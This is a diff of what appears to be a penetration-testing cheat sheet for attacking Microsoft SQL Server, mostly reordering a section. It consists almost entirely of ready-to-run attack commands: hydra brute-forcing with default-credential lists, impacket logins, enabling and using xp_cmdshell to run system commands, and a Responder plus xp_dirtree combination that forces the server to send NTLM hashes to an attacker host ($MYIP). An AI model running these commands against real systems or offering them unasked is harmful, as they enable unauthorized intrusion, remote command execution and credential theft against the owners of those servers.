@@ -1157,10 +1157,15 @@ cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mssql-betterdefa
 cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt | cut -d: -f2 | sort -u > /tmp/mssqlpasswords
 hydra -I mssql://$TARGET -L /tmp/mssqlusernames -P /tmp/mssqlpasswords -e n -t15 2>/dev/null
 
-+---------- Impacket ----------+
-impacket-mssqlclient -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass
++---------- Login ----------+
+impacket-mssqlclient -k -no-pass -dc-ip $TARGET -target-ip $TARGET $DC
 impacket-mssqlclient '$DOM'/'$USERNAME':'$PASSWORD'@'$TARGET'
 impacket-mssqlclient '$DOM'/'$USERNAME':'$PASSWORD'@'$TARGET' -windows-auth
+
++---------- Get Hash ----------+
+sudo responder -I tun0 -v
+xp_dirtree \\$MYIP\$;
+DB_NAME="master"; sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "EXEC xp_dirtree '//$MYIP/RESPONDER';"
 
 +---------- Get DB ----------+
 sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -C "SELECT name FROM master.dbo.sysdatabases;" | grep -oP '^name:\s*\K\S+'
@@ -1178,10 +1183,6 @@ sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "SELECT
 sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "SELECT @@VERSION AS version, HOST_NAME() AS hostname, SYSTEM_USER AS sys_user;"
 sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
 sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "EXEC xp_cmdshell 'dir C:\ && whoami /user /priv';"
-
-+---------- Get Hash ----------+
-sudo responder -I tun0 -v
-DB_NAME="master"; sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "EXEC xp_dirtree '//$MYIP/RESPONDER';"
 
 +---------- Proxy MSSQL ----------+
 wget https://github.com/0xdf-0xdf/mssqlproxy/raw/refs/heads/python3/mssqlclient.py
